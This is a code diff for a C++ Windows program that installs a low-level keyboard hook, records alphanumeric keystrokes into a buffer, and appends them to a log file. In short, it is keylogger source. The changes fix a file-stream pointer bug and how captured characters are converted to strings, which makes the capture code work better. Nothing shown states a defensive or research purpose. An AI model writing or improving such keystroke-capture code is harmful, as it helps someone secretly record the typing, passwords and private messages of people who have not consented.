@@ -4,9 +4,9 @@
 #include <windows.h>
 #include <vector>
 #include <string>
+#include <sstream>
 
 std::string fileName;
-std::ofstream* ofs;
 std::vector<std::string> codepointStringBuffer;
 
 static void DumpCharacterBuffer() {
@@ -64,7 +64,11 @@ LRESULT CALLBACK KeyboardProc(int nCode,
                 char ch = (char) vkCode;
 
                 if (std::isalnum(vkCode)) {
-                    codepointStringBuffer.push_back(std::to_string(ch));
+                    std::stringstream ss;
+                    ss << ch;
+                    std::string s;
+                    ss >> s;
+                    codepointStringBuffer.push_back(s);
                 }
             }
 
@@ -84,8 +88,9 @@ int WinMain(HINSTANCE hInstance,
     fileName = pCmdLine;    
 
     // Mark the start of session:
-    std::ofstream myOutputFileStream(fileName, std::ios_base::app);
-    ofs = &myOutputFileStream;
+    std::ofstream ofs(fileName, std::ios_base::app);
+    ofs << "<START>";
+    ofs.close();
 
     SetWindowsHookExA(WH_KEYBOARD_LL,
                       KeyboardProc,
